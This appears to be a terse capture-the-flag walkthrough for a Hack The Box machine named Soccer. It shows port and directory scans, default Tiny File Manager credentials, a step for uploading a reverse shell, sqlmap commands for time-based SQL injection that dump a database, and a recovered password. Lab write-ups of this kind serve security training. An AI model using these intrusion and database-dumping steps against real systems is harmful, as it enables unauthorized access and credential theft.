# Soccer

## IP = 10.10.11.194

## Nmap

### Fullscan
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 05:08 EST
Nmap scan report for 10.10.11.194
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

Nmap done: 1 IP address (1 host up) scanned in 24.59 seconds
```

## Gobuster
```
# gobuster dir -u "http://soccer.htb/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
===============================================================
Gobuster v3.1.0 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/01/28 05:22:09 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
                                                                              
===============================================================
2023/01/28 05:58:12 Finished
===============================================================
```

### Default credentials on tiny: `user:12345`
### Check the `tinyfilemanager.php`:
```php
// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);
```

### Log with admin, upload revershe shell
#### Destination Folder: /var/www/html/tiny/uploads



Things to check:
- Vagrant, cloud-init
- WebSocket


### timebased sql injection in WebSocket
`sqlmap -u "http://localhost:8081/?id=1" --batch --dbs`

[04:01:20] [INFO] retrieved: 'debian-sys-maint'@'localhost'        
[04:06:40] [INFO] retrieved: 'mysql.infoschema'@'localhost'           
[04:11:56] [INFO] retrieved: 'mysql.session'@'localhost'               
[04:16:46] [INFO] retrieved: 'mysql.sys'@'localhost'                  
[04:20:58] [INFO] retrieved: 'player'@'localhost'                    
[04:24:35] [INFO] retrieved: 'root'@'localhost'

`sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -t accounts --dump`

PlayerOftheMatch2022


### for root
https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/
